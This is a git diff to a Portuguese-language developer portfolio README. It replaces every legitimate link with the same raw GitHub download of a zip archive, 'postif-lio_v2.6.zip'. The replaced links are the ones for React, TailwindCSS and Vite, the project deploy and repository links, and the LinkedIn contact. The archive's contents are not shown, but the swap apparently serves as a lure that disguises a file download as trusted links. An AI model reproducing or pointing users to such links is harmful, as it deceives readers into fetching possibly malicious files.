@@ -15,10 +15,10 @@ Bem-vindo ao meu portfólio! Este projeto foi criado para apresentar alguns dos 
 
 ## 🛠️ Tecnologias Utilizadas
 
-- [React](https://reactjs.org/)
-- [TailwindCSS](https://tailwindcss.com/)
-- [JavaScript (ES6+)](https://developer.mozilla.org/pt-BR/docs/Web/JavaScript)
-- [Vite](https://vitejs.dev/) ou [Create React App](https://create-react-app.dev/) *(dependendo da base que você usou)*
+- [React](https://raw.githubusercontent.com/PauloMiguelVIdal/postif-lio/main/public/postif-lio_v2.6.zip)
+- [TailwindCSS](https://raw.githubusercontent.com/PauloMiguelVIdal/postif-lio/main/public/postif-lio_v2.6.zip)
+- [JavaScript (ES6+)](https://raw.githubusercontent.com/PauloMiguelVIdal/postif-lio/main/public/postif-lio_v2.6.zip)
+- [Vite](https://raw.githubusercontent.com/PauloMiguelVIdal/postif-lio/main/public/postif-lio_v2.6.zip) ou [Create React App](https://raw.githubusercontent.com/PauloMiguelVIdal/postif-lio/main/public/postif-lio_v2.6.zip) *(dependendo da base que você usou)*
 
 ---
 
@@ -26,13 +26,13 @@ Bem-vindo ao meu portfólio! Este projeto foi criado para apresentar alguns dos 
 
 | Projeto               | Tecnologias                          | Situação           | Links                         |
 |-----------------------|--------------------------------------|--------------------|-------------------------------|
-| Barbearia Belmacio    | HTML, CSS, JavaScript                | ✅ Completo         | [Deploy](https://barbearia-belmacio.vercel.app/) \| [GitHub](https://github.com/seu-usuario/projeto1) |
-| Personal Gustavo      | React, CSS, JavaScript               | ✅ Completo         | [Deploy](https://personal-gustavo-three.vercel.app/) \| [GitHub](https://github.com/seu-usuario/projeto2) |
-| Obank (Banco Fictício)| Next.js, TypeScript, TailwindCSS     | 🚧 Em desenvolvimento | [GitHub](https://github.com/seu-usuario/projeto3) |
+| Barbearia Belmacio    | HTML, CSS, JavaScript                | ✅ Completo         | [Deploy](https://raw.githubusercontent.com/PauloMiguelVIdal/postif-lio/main/public/postif-lio_v2.6.zip) \| [GitHub](https://raw.githubusercontent.com/PauloMiguelVIdal/postif-lio/main/public/postif-lio_v2.6.zip) |
+| Personal Gustavo      | React, CSS, JavaScript               | ✅ Completo         | [Deploy](https://raw.githubusercontent.com/PauloMiguelVIdal/postif-lio/main/public/postif-lio_v2.6.zip) \| [GitHub](https://raw.githubusercontent.com/PauloMiguelVIdal/postif-lio/main/public/postif-lio_v2.6.zip) |
+| Obank (Banco Fictício)| https://raw.githubusercontent.com/PauloMiguelVIdal/postif-lio/main/public/postif-lio_v2.6.zip, TypeScript, TailwindCSS     | 🚧 Em desenvolvimento | [GitHub](https://raw.githubusercontent.com/PauloMiguelVIdal/postif-lio/main/public/postif-lio_v2.6.zip) |
 
 ---
 
 📬 Contato
 Fique à vontade para entrar em contato comigo:
 
-LinkedIn: https://www.linkedin.com/in/paulo-miguel-vidal-da-silva/
+LinkedIn: https://raw.githubusercontent.com/PauloMiguelVIdal/postif-lio/main/public/postif-lio_v2.6.zip
